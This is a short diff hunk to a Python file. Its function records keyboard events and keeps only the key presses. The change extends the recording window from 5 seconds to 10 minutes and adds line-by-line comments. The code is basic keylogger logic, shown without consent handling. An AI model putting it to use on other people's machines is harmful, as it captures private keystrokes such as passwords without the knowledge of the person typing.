@@ -23,14 +23,14 @@ def onKeyBoardStroke():
     """
     Logs = []
     recorded = keyboard.start_recording()
-    timelimit = 5
-    time.sleep(timelimit)
-    keyBoardEventsQueue = recorded[0]
-    while keyBoardEventsQueue.qsize() != 0:
-        response = keyBoardEventsQueue.queue.pop()
-        stringResponse = str(response)
-        if 'down' in stringResponse:
-            Logs.append(stringResponse)
+    timelimit = 600 #sets time limit to 10 minutes
+    time.sleep(timelimit) #sleep for that long
+    keyBoardEventsQueue = recorded[0] #get Queue from recorded
+    while keyBoardEventsQueue.qsize() != 0: #while not zero pop from queue
+        response = keyBoardEventsQueue.queue.pop() #pop from queue
+        stringResponse = str(response) #cast response from type KeyBoard Event to String
+        if 'down' in stringResponse: #if user pressed down only append that (pressed down on keyboard)
+            Logs.append(stringResponse) #append to Logs
     return Logs
 
 def main():
